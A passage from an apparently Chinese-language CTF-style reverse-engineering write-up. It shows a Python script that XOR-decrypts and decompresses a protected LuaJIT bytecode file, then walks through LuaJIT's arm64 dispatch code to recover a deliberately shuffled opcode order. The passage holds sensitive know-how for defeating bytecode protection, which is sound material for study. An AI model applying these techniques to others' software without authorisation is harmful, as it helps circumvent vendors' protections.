class="number">0x97ebec50</span>, <span class="number">0x78b83de9</span>, <span class="number">0x73ec6c48</span>, <span class="number">0x6b7b4b63</span>, <span class="number">0x16aa6ba8</span>, <span class="number">0xa2039a01</span>, <span class="number">0x804b4464</span>, <span class="number">0x68942114</span>, <span class="number">0xa8dd6a02</span>, <span class="number">0x0d80029f</span>, <span class="number">0x374c2cbf</span>, <span class="number">0xfb353d8c</span>, <span class="number">0x3324161b</span>,</span><br><span class="line">    <span class="number">0x0d2757de</span>, <span class="number">0x7f491efb</span>, <span class="number">0xb4456140</span>, <span class="number">0x3ffe2164</span>, <span class="number">0x9c967463</span>, <span class="number">0x27f7b5b8</span>, <span class="number">0xca0cd170</span>, <span class="number">0x044f53a4</span>, <span class="number">0x893563e7</span>, <span class="number">0xedbce4d8</span>, <span class="number">0x021b5414</span>, <span class="number">0x4a46b308</span>, <span class="number">0x5ab79e4a</span>, <span class="number">0x554f4a3f</span>, <span class="number">0xe4db258e</span>, <span class="number">0x7af947a4</span>, <span class="number">0x079e4882</span>, <span class="number">0x7ca6cf87</span>, <span class="number">0x8039be38</span>, <span class="number">0xdf33dc9a</span>,</span><br><span class="line">    <span class="number">0xeea9b4e7</span>, <span class="number">0x0910e3b0</span>, <span class="number">0x579762f8</span>, <span class="number">0x7cafa12c</span>, <span class="number">0x2bafb910</span>, <span class="number">0x355e70bf</span>, <span class="number">0x95982c0e</span>, <span class="number">0xb5fa17b3</span>, <span class="number">0xcddbbfff</span>, <span class="number">0xbe459e56</span>, <span class="number">0xb10af261</span>, <span class="number">0x5c2a2af1</span>, <span class="number">0x4eee8c3a</span>, <span class="number">0x65d14d8a</span>, <span class="number">0x95897345</span>, <span class="number">0x7a4a7fd8</span>, <span class="number">0x6cc41bec</span>, <span class="number">0x7dec212c</span>, <span class="number">0xc0ea7b93</span>, <span class="number">0x6b57d950</span>,</span><br><span class="line">    <span class="number">0xf16b98fd</span>, <span class="number">0xcdbc3491</span>, <span class="number">0x02d35ee0</span>, <span class="number">0xb1aba563</span>, <span class="number">0x2ad6fa58</span>, <span class="number">0x194b1e34</span>, <span class="number">0x89087286</span>, <span class="number">0x3d3ccca1</span>, <span class="number">0xb9fdf788</span>, <span class="number">0xf1e30c50</span>, <span class="number">0x5729a64b</span>, <span class="number">0x0a5befc6</span>, <span class="number">0x1f76c0b2</span>, <span class="number">0x3e77ea9d</span>, <span class="number">0x8a355c32</span>, <span class="number">0xdf45cd17</span>, <span class="number">0x985e31a6</span>, <span class="number">0xd29a51ca</span>, <span class="number">0x56f0b429</span>, <span class="number">0x042d4a8c</span>,</span><br><span class="line">    <span class="number">0xdd765852</span>, <span class="number">0x63715628</span>, <span class="number">0x738cebe6</span>, <span class="number">0xfc2df4b1</span>, <span class="number">0x9b5ba9d6</span>, <span class="number">0x96f78f67</span>, <span class="number">0xcc2e210f</span>, <span class="number">0x9c6d611a</span>, <span class="number">0x366d6791</span>, <span class="number">0x9a43361c</span>, <span class="number">0x5fb81ec9</span>, <span class="number">0xb9fe6794</span>, <span class="number">0x7375d302</span>, <span class="number">0xc62fa818</span>, <span class="number">0xcc6e19ae</span>, <span class="number">0x2f4d38de</span>, <span class="number">0xd0010ed6</span>, <span class="number">0xae25aae8</span>, <span class="number">0xca30036e</span>, <span class="number">0xd615450a</span>,</span><br><span class="line">    <span class="number">0xf244f954</span>, <span class="number">0x82959369</span>, <span class="number">0x7031c12f</span>, <span class="number">0x5933a6dd</span>, <span class="number">0x1169558f</span>, <span class="number">0x2b2ee00b</span>, <span class="number">0x6f89f242</span>, <span class="number">0x14149c3e</span>, <span class="number">0xee2fa1b1</span>, <span class="number">0xaa020888</span>, <span class="number">0x5285bcbe</span>, <span class="number">0x6b1a451d</span>, <span class="number">0x17c862ac</span>, <span class="number">0x677a7201</span>, <span class="number">0xaae07dfa</span>, <span class="number">0x61daeaa5</span>, <span class="number">0x0d4fb80e</span>, <span class="number">0x7d74345f</span>, <span class="number">0xc512b3bb</span>, <span class="number">0x566bb4d0</span>,</span><br><span class="line">    <span class="number">0x06c69771</span>, <span class="number">0xe4955e92</span>, <span class="number">0xe2b5d04d</span>, <span class="number">0x5df4ee34</span>, <span class="number">0x3928168a</span>, <span class="number">0x48ed0c2a</span>, <span class="number">0xd7d95fe1</span>, <span class="number">0xf01c3264</span>, <span class="number">0x86cdc089</span>, <span class="number">0xa46b7cfb</span>, <span class="number">0x2fede941</span>, <span class="number">0x74ec18e2</span>, <span class="number">0x9d56e1cc</span>, <span class="number">0xcce5dc4c</span>, <span class="number">0xdbeabd6d</span>, <span class="number">0x9480971f</span>, <span class="number">0x786dcaa1</span>, <span class="number">0xad272375</span>, <span class="number">0x20003617</span>, <span class="number">0xe13ad0f6</span>,</span><br><span class="line">    <span class="number">0xf0d86596</span>, <span class="number">0xf61b898b</span>, <span class="number">0x2aac895a</span>, <span class="number">0x241aad94</span>, <span class="number">0x3da6a9a8</span>, <span class="number">0x6d0bc797</span>, <span class="number">0xa92e8a90</span>, <span class="number">0x6e737090</span>, <span class="number">0x82c35afa</span>, <span class="number">0xdea3a945</span>, <span class="number">0x2fd754bd</span>, <span class="number">0x7a23f110</span>, <span class="number">0xf0f1a2f0</span>, <span class="number">0xf17280a2</span>, <span class="number">0x3f1eda1c</span>, <span class="number">0x0f03ed4e</span>, <span class="number">0x3e02d44a</span>, <span class="number">0x6073f404</span>, <span class="number">0x026302c6</span>, <span class="number">0xf9aa2e7d</span>,</span><br><span class="line">    <span class="number">0x191eeded</span>, <span class="number">0x5857dfca</span>, <span class="number">0x4bd140d3</span>, <span class="number">0xe04e4969</span>, <span class="number">0xad0c6975</span>, <span class="number">0xdabc6526</span>, <span class="number">0x40db87f6</span>, <span class="number">0xd3fcb14d</span>, <span class="number">0x5f6733a7</span>, <span class="number">0xbdced7fd</span>, <span class="number">0x7fdf2471</span>, <span class="number">0x983bea50</span>, <span class="number">0x15ab4e1a</span>, <span class="number">0x408265c6</span>, <span class="number">0xb33b1df3</span>, <span class="number">0xfec4aae0</span>, <span class="number">0x299e846a</span>, <span class="number">0xd1a8f4aa</span>, <span class="number">0xbe72d405</span>, <span class="number">0x1ab0b5d1</span>,</span><br><span class="line">    <span class="number">0x5fb1b52d</span>, <span class="number">0x9232ccdb</span>, <span class="number">0xbbfd8112</span>, <span class="number">0xf7198310</span>, <span class="number">0xeab71190</span>, <span class="number">0x135fe561</span>, <span class="number">0xbe0dcc84</span>, <span class="number">0x17601c74</span>, <span class="number">0x31ac3a98</span>, <span class="number">0xd67ca4b6</span>, <span class="number">0x99f14711</span>, <span class="number">0x5475ba0b</span>, <span class="number">0xbc011f67</span>, <span class="number">0x7f84e0d5</span>, <span class="number">0x506acdb6</span>, <span class="number">0x47bc32d1</span>, <span class="number">0x807de61d</span>, <span class="number">0x889f6834</span>, <span class="number">0x13be14a7</span>, <span class="number">0xe55f0f4c</span>,</span><br><span class="line">    <span class="number">0x3289738b</span>, <span class="number">0xea35b862</span>, <span class="number">0x8a2cab9f</span>, <span class="number">0xf64f4dfc</span>, <span class="number">0x6e255608</span>, <span class="number">0x718a29c1</span>, <span class="number">0xe36ada40</span>, <span class="number">0x570d6a97</span>, <span class="number">0x661e616d</span>, <span class="number">0x68b69cd3</span>, <span class="number">0xd075c3f4</span>, <span class="number">0x71e9cfbd</span>, <span class="number">0x4ab3086b</span>, <span class="number">0xd8e2d945</span>, <span class="number">0x632a0c6e</span>, <span class="number">0xbe0e6145</span>, <span class="number">0xe60a45c9</span>, <span class="number">0x5467aa5a</span>, <span class="number">0x812dc36e</span>, <span class="number">0xc8ed5ed9</span>,</span><br><span class="line">    <span class="number">0xc2aa5ac8</span>, <span class="number">0xb7bee330</span>, <span class="number">0x2a0b5456</span>, <span class="number">0xf4246482</span>, <span class="number">0x0ceaf7d9</span>, <span class="number">0xcba5b9b5</span>, <span class="number">0x1edb9f9b</span>, <span class="number">0xff7feefd</span>, <span class="number">0x36599e26</span>, <span class="number">0x350db259</span>, <span class="number">0x3d16422e</span>, <span class="number">0xff94c0a0</span>, <span class="number">0x15a7185c</span>, <span class="number">0x333b4cef</span>, <span class="number">0x91481df8</span>, <span class="number">0x882c24b8</span>, <span class="number">0x9ffc1ff5</span>, <span class="number">0xdc64b9ba</span>, <span class="number">0x0cb8510c</span>, <span class="number">0xfb68492d</span>,</span><br><span class="line">    <span class="number">0x41d8f2a2</span>, <span class="number">0xeebe9afd</span>, <span class="number">0x7d1de998</span>, <span class="number">0xd0a8aaf0</span>, <span class="number">0x1df9329a</span>, <span class="number">0xaf2cc29a</span>, <span class="number">0x07635562</span>, <span class="number">0xae187f03</span>, <span class="number">0x858d40da</span>, <span class="number">0x996462dd</span>, <span class="number">0x196b8b75</span>, <span class="number">0xbed95cda</span>, <span class="number">0xabe4ab1c</span>, <span class="number">0xd9fc2e50</span>, <span class="number">0xd59f74c8</span>, <span class="number">0x174bf4bc</span>, <span class="number">0xf8a5bd8a</span>, <span class="number">0x9b1b0756</span>, <span class="number">0x2747c3b8</span>, <span class="number">0x3145d4e1</span>,</span><br><span class="line">    <span class="number">0x3145d42a</span>, <span class="number">0xccfa3831</span>, <span class="number">0xc98fce4a</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_xor</span>(<span class="params">array: <span class="built_in">list</span>, nblocks: <span class="built_in">int</span></span>):</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    idx2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; nblocks <span class="keyword">and</span> idx &lt; <span class="number">0x200</span>:</span><br><span class="line">        array[idx] ^= enc_tbl[idx2]</span><br><span class="line">        idx2 = (idx2 + <span class="number">1</span>) % <span class="built_in">len</span>(enc_tbl)</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> idx &lt; nblocks <span class="keyword">and</span> idx &lt; nblocks - <span class="number">0x200</span>:</span><br><span class="line">        array[idx] ^= enc_tbl[idx2]</span><br><span class="line">        idx2 = (idx2 + <span class="number">1</span>) % <span class="built_in">len</span>(enc_tbl)</span><br><span class="line">        idx += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> idx &lt; nblocks:</span><br><span class="line">        array[idx] ^= enc_tbl[idx2]</span><br><span class="line">        idx2 = (idx2 + <span class="number">1</span>) % <span class="built_in">len</span>(enc_tbl)</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_file</span>(<span class="params">if_path: <span class="built_in">str</span>, of_path: <span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(if_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data =  f.read()</span><br><span class="line">    <span class="keyword">assert</span> data[:<span class="number">4</span>] == file_magic</span><br><span class="line"></span><br><span class="line">    cipher = data[<span class="number">20</span>:]</span><br><span class="line">    compressed_size = <span class="built_in">len</span>(cipher)</span><br><span class="line">    nblocks = compressed_size // block_size</span><br><span class="line">    plain = [<span class="number">0</span>] * nblocks </span><br><span class="line">    target_crc, _, origin_size = struct.unpack(<span class="string">&quot;3I&quot;</span>, data[<span class="number">8</span>:<span class="number">20</span>])</span><br><span class="line">    <span class="keyword">assert</span> nblocks &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nblocks):</span><br><span class="line">        plain[i], = struct.unpack(<span class="string">&#x27;I&#x27;</span>, cipher[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">    do_xor(plain, nblocks)</span><br><span class="line"></span><br><span class="line">    compressed = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nblocks):</span><br><span class="line">        compressed += struct.pack(<span class="string">&#x27;I&#x27;</span>, plain[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> compressed_size % block_size:</span><br><span class="line">        compressed += cipher[-(compressed_size % block_size):]</span><br><span class="line"></span><br><span class="line">    plain = zlib.decompress(compressed)</span><br><span class="line">    <span class="keyword">assert</span> zlib.crc32(plain) &amp; <span class="number">0xFFFFFFFF</span> == target_crc</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(of_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> g:</span><br><span class="line">        g.write(plain)</span><br><span class="line"></span><br><span class="line">decrypt_file(<span class="string">&quot;526018661&quot;</span>, <span class="string">&quot;Util.luac64&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="识别乱序-opcode"><a href="#识别乱序-opcode" class="headerlink" title="识别乱序 opcode"></a>识别乱序 opcode</h2><p>如果用现有反编译工具直接反编译得到的 luac64 文件，结果一定是不正确的，因为 LuaJIT 引擎的 opcode 顺序被修改了。这一板块主要介绍如何在 Native 层中识别并还原出引擎的 opcode 顺序。</p><p>在 <code>lj_obj.h</code> 文件中，我们可以找到 <strong>lua_State</strong> 结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per-thread state object. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lua_State</span> &#123;</span></span><br><span class="line">  GCHeader;</span><br><span class="line">  <span class="keyword">uint8_t</span> dummy_ffid;<span class="comment">/* Fake FF_C for curr_funcisL() on dummy frames. */</span></span><br><span class="line">  <span class="keyword">uint8_t</span> status;<span class="comment">/* Thread status. */</span></span><br><span class="line">  MRef glref;<span class="comment">/* Link to global state. */</span></span><br><span class="line">  GCRef gclist;<span class="comment">/* GC chain. */</span></span><br><span class="line">  TValue *base;<span class="comment">/* Base of currently executing function. */</span></span><br><span class="line">  TValue *top;<span class="comment">/* First free slot in the stack. */</span></span><br><span class="line">  MRef maxstack;<span class="comment">/* Last free slot in the stack. */</span></span><br><span class="line">  MRef <span class="built_in">stack</span>;<span class="comment">/* Stack base. */</span></span><br><span class="line">  GCRef openupval;<span class="comment">/* List of open upvalues in the stack. */</span></span><br><span class="line">  GCRef env;<span class="comment">/* Thread environment (table of globals). */</span></span><br><span class="line">  <span class="keyword">void</span> *cframe;<span class="comment">/* End of C stack frame chain. */</span></span><br><span class="line">  MSize stacksize;<span class="comment">/* True stack size (incl. LJ_STACK_EXTRA). */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中 <code>glref</code> 字段指向了 <strong>global_State</strong> 结构体，顾名思义，其保存着 LuaJIT 的一些全局信息，由所有线程共享。但是我们无需去关心它的定义，因为我们感兴趣的字段不在这个结构体中，只是借助它来找到一个名为 <strong>GG_State</strong> 的结构体，后者保存着更为顶层的全局信息，其定义在 <code>lj_dispatch.h</code> 文件中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Global state, main thread and extra fields are allocated together. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GG_State</span> &#123;</span></span><br><span class="line">  lua_State L;<span class="comment">/* Main thread. */</span></span><br><span class="line">  global_State g;<span class="comment">/* Global state. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> LJ_TARGET_MIPS</span></span><br><span class="line">  ASMFunction got[LJ_GOT__MAX];<span class="comment">/* Global offset table. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> LJ_HASJIT</span></span><br><span class="line">  jit_State J;<span class="comment">/* JIT state. */</span></span><br><span class="line">  HotCount hotcount[HOTCOUNT_SIZE];<span class="comment">/* Hot counters. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  ASMFunction dispatch[GG_LEN_DISP];<span class="comment">/* Instruction dispatch tables. */</span></span><br><span class="line">  BCIns bcff[GG_NUM_ASMFF];<span class="comment">/* Bytecode for ASM fast functions. */</span></span><br><span class="line">&#125; GG_State;</span><br></pre></td></tr></table></figure><p>这里可以发现一个非常有意思的的字段 <code>dispatch</code>，后方的注释也告诉我们该数组是 LuaJIT 内部维护的一张指令跳转表，每条 LuaJIT 虚拟机指令都能在这个数组中找到对应的处理例程。</p><p>现在我们来研究一下 LuaJIT 是怎么取指令和译码分发的，搞清楚这个流程才能找到跳转表的位置，进而才能找到各指令的具体实现及它们的先后顺序。</p><p>不妨在 LuaJIT 源码中跟一下 <em>luaL_loadbuffer</em> 函数的实现，看看它到底是如何加载运行 LuaJIT 字节码的，该函数定义在 <code>lj_load.c</code> 文件中，下面一并列出相关函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LUALIB_API <span class="keyword">int</span> <span class="title">luaL_loadbuffer</span><span class="params">(lua_State *L, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> luaL_loadbufferx(L, buf, size, name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LUALIB_API <span class="keyword">int</span> <span class="title">luaL_loadbufferx</span><span class="params">(lua_State *L, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  StringReaderCtx ctx;</span><br><span class="line">  ctx.str = buf;</span><br><span class="line">  ctx.size = size;</span><br><span class="line">  <span class="keyword">return</span> lua_loadx(L, reader_string, &amp;ctx, name, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LUA_API <span class="keyword">int</span> <span class="title">lua_loadx</span><span class="params">(lua_State *L, lua_Reader reader, <span class="keyword">void</span> *data,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> <span class="keyword">char</span> *chunkname, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LexState ls;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">  ls.rfunc = reader;</span><br><span class="line">  ls.rdata = data;</span><br><span class="line">  ls.chunkarg = chunkname ? chunkname : <span class="string">&quot;?&quot;</span>;</span><br><span class="line">  ls.mode = mode;</span><br><span class="line">  lj_buf_init(L, &amp;ls.sb);</span><br><span class="line">  status = lj_vm_cpcall(L, <span class="literal">NULL</span>, &amp;ls, cpparser);</span><br><span class="line">  lj_lex_cleanup(L, &amp;ls);</span><br><span class="line">  lj_gc_check(L);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，<em>luaL_loadbuffer</em> 内部在完成一些结构体的初始化工作后，实际通过 <em>lj_vm_cpcall</em> 函数来启动 LuaJIT 虚拟机，并且当前脚本运行结束后，会将状态码存放到局部变量 status 中。因此我们应该着重分析 <em>lj_vm_cpcall</em>。</p><p>这里插一句题外话，LuaJIT 为了追求虚拟机性能，特意使用汇编来书写 vm 的核心功能，其中包括取指令、译码执行等部分，并针对不同的架构定制了对应的 dasc 文件。本题的 so 是 arm64 架构，因此接下来的分析将基于 <code>vm_arm64.dasc</code> 文件。</p><p>在 <code>vm_arm64.dasc</code> 第 526 行可以找到 <em>lj_vm_cpcall</em> 的实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">|-&gt;vm_cpcall:// Setup protected C frame, call C.</span><br><span class="line">|  // (lua_State *L, lua_CFunction func, void *ud, lua_CPFunction cp)</span><br><span class="line">|  saveregs</span><br><span class="line">|  mov L, CARG1</span><br><span class="line">|   ldr RA, L:CARG1-&gt;stack</span><br><span class="line">|  str CARG1, SAVE_L</span><br><span class="line">|    ldr GL, L-&gt;glref// Setup pointer to global state.</span><br><span class="line">|   ldr RB, L-&gt;top</span><br><span class="line">|  str CARG1, SAVE_PC// Any value outside of bytecode is ok.</span><br><span class="line">|  ldr RC, L-&gt;cframe</span><br><span class="line">|   sub RA, RA, RB// Compute -savestack(L, L-&gt;top).</span><br><span class="line">|   str RAw, SAVE_NRES// Neg. delta means cframe w/o frame.</span><br><span class="line">|  str wzr, SAVE_ERRF// No error function.</span><br><span class="line">|  str RC, SAVE_CFRAME</span><br><span class="line">|  str fp, L-&gt;cframe// Add our C frame to cframe chain.</span><br><span class="line">|    str L, GL-&gt;cur_L</span><br><span class="line">|  blr CARG4// (lua_State *L, lua_CFunction func, void *ud)</span><br><span class="line">|  mov BASE, CRET1</span><br><span class="line">|   mov PC, #FRAME_CP</span><br><span class="line">|  cbnz BASE, &lt;3// Else continue with the call.</span><br><span class="line">|  b -&gt;vm_leave_cp// No base? Just remove C frame.</span><br></pre></td></tr></table></figure><p>其中有一句 <code>ldr GL, L-&gt;glref</code> 将 <strong>global_State</strong> 结构体地址赋值给 GL，GL 的定义如下，其实就是 x22 寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|.define GLREG,x22// Global state.</span><br><span class="line">...</span><br><span class="line">|.type GL,global_State,GLREG</span><br></pre></td></tr></table></figure><p>接着程序正常执行，会通过 <code>cbnz BASE, &lt;3</code> 跳转到前面的 <code>标签 3</code> 处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">|3:  // Entry point for vm_cpcall/vm_resume (BASE = base, PC = ftype).</span><br><span class="line">|  str L, GL-&gt;cur_L</span><br><span class="line">|  ldp RB, CARG1, L-&gt;base// RB = old base (for vmeta_call).</span><br><span class="line">|    movz TISNUM, #(LJ_TISNUM&gt;&gt;1)&amp;0xffff, lsl #48</span><br><span class="line">|    movz TISNUMhi, #(LJ_TISNUM&gt;&gt;1)&amp;0xffff, lsl #16</span><br><span class="line">|  add PC, PC, BASE</span><br><span class="line">|    movn TISNIL, #0</span><br><span class="line">|  sub PC, PC, RB// PC = frame delta + frame type</span><br><span class="line">|   sub NARGS8:RC, CARG1, BASE</span><br><span class="line">|    st_vmstate ST_INTERP</span><br><span class="line">|</span><br><span class="line">|-&gt;vm_call_dispatch:</span><br><span class="line">|  // RB = old base, BASE = new base, RC = nargs*8, PC = caller PC</span><br><span class="line">|  ldr CARG3, [BASE, FRAME_FUNC]</span><br><span class="line">|  checkfunc CARG3, -&gt;vmeta_call</span><br><span class="line">|</span><br><span class="line">|-&gt;vm_call_dispatch_f:</span><br><span class="line">|  ins_call</span><br></pre></td></tr></table></figure><p>在设置好一些虚拟机将用到的寄存器初值后（PC 等），通过 <em>ins_call</em> 宏正式开始第一条指令的解释执行。该宏被声明在 214 行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|.macro ins_call</span><br><span class="line">|  // BASE = new base, CARG3 = LFUNC/CFUNC, RC = nargs*8, PC = caller PC</span><br><span class="line">|  str PC, [BASE, FRAME_PC]</span><br><span class="line">|  ins_callt</span><br><span class="line">|.endmacro</span><br></pre></td></tr></table></figure><p>其中 <em>ins_callt</em> 也是一个宏定义，将其展开得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|.macro ins_call</span><br><span class="line">|  // BASE = new base, CARG3 = LFUNC/CFUNC, RC = nargs*8, PC = caller PC</span><br><span class="line">|  str PC, [BASE, FRAME_PC]</span><br><span class="line">|  ldr PC, LFUNC:CARG3-&gt;pc</span><br><span class="line">|  ldr INSw, [PC], #4</span><br><span class="line">|  add TMP1, GL, INS, uxtb #3</span><br><span class="line">|   decode_RA RA, INS</span><br><span class="line">|  ldr TMP0, [TMP1, #GG_G2DISP]</span><br><span class="line">|   add RA, BASE, RA, lsl #3</span><br><span class="line">|  br TMP0</span><br><span class="line">|.endmacro</span><br></pre></td></tr></table></figure><p><strong>取指令</strong>部分主要通过 <code>ldr INSw, [PC], #4</code> 实现，PC 和 INSw 都定义在了文件头，分别是 x21 和 w16 寄存器。这句汇编的意思就是从 x21 指向的空间里取来 32 bits 存放到 x16 的低四字节，然后 x21 自增 4（指向下一条指令），由此也可以得知 LuaJIT 采用定长指令集，每条指令长度为 4 字节。</p><p><strong>译码</strong>部分主要通过 <code>decode_RA RA, INS</code> 宏和 <code>add RA, BASE, RA, lsl #3</code> 来解析操作数（这个我们不关心），计算目标跳转地址的方式也终于在此处呈现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add TMP1, GL, INS, uxtb #3</span><br><span class="line">ldr TMP0, [TMP1, #GG_G2DISP]</span><br><span class="line">br TMP0</span><br></pre></td></tr></table></figure><p>这里的 TMP0 和 TMP1 分别是 x8 和 x9 寄存器，INS 就是 x16 寄存器。以上三条汇编可解释为：</p><ul><li><code>add TMP1, GL, INS, uxtb #3</code>：将 x16 的最低字节（opcode）无符号扩展到 32 位（uxtb）后，左移 3 位（乘 8），再加上 x22 （GL）赋值给 x9，即 <code>x9 = x22 + (((unsigned int)(x16 &amp; 0xFF)) &lt;&lt; 3) </code></li><li><code>ldr TMP0, [TMP1, #GG_G2DISP]</code>：从 x9 加上常数 #GG_G2DISP 后指向的地址空间里取出 8 字节放到 x8，此时的 x8 即为当前虚拟机指令的 opcode 所对应的处理例程地址</li><li><code>br TMP0</code> 跳转到处理例程去执行</li></ul><p>其中 <em>GG_G2DISP</em> 定义在 <code>lj_dispatch.h</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GG_State</span> &#123;</span></span><br><span class="line">  ...</span><br><span class="line">  global_State g;<span class="comment">/* Global state. */</span></span><br><span class="line">  ...</span><br><span class="line">  ASMFunction dispatch[GG_LEN_DISP];<span class="comment">/* Instruction dispatch tables. */</span></span><br><span class="line">  ...</span><br><span class="line">&#125; GG_State;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GG_OFS(field)((int)offsetof(GG_State, field))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GG_G2DISP(GG_OFS(dispatch) - GG_OFS(g))</span></span><br></pre></td></tr></table></figure><p>即 <strong>GG_State</strong> 结构体的 g 字段与 